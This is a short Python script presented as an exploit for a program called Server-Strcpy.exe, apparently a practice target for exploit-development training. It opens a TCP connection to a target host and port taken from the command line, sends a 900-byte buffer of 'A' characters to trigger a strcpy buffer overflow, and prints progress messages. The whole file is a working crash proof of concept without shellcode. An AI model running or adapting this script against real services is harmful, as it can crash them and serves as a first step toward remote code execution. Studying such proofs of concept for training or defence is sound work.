
#!/usr/bin/env python
# Server-Strcpy.exe exploit by superkojiman
# http://blog.techorganic.com

import socket, sys




def main(target, port):




	buffer = "\x41" * 900
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target, int(port)))
	print "[+] sending payload of length", len(buffer)
	s.send(buffer)
	s.close()
	print "[+] done"

if __name__ == "__main__":
	main(sys.argv[1], sys.argv[2])
